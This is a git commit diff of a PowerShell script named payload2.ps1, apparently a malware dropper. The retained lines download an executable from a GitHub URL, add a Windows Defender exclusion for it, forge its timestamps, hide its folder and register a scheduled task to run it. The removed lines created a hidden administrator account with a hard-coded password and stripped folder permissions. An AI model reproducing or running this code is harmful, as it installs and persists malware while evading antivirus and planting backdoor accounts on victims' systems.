b172d394bacc17950c35a4a8fe2f51b556739fff
milujemnastenky <nastenkaferi@proton.me>
2025-04-04 16:19:49 +0200

    Update payload2.ps1

--- apps/payload2.ps1
+++ apps/payload2.ps1
@@ -2,8 +2,6 @@ New-Item -ItemType Directory -Path C:\Users\Public\krnl
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl-debug.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
-Start-Sleep -Seconds 10
-
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:09")
@@ -15,25 +13,6 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name LastWr
 Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name CreationTime -Value (Get-Date "2024-12-13 14:24:57")
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
-
-
-
-net user krnlrunner "1234ggA" /add /y
-
-net localgroup Administrators krnlrunner /add
-
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f
-
-attrib +s +h "C:\Users\Public\krnl\schvostkrnl-debug.exe"
-
-icacls "C:\Users\Public\krnl" /inheritance:r
-
-icacls "C:\Users\Public\krnl" /remove "Users"
-
-icacls "C:\Users\Public\krnl" /remove "Everyone"
-
-icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
-
 
 Register-ScheduledTask -TaskName "WINschvostkrnl" `
   -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start C:\Users\Public\krnl\schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") `
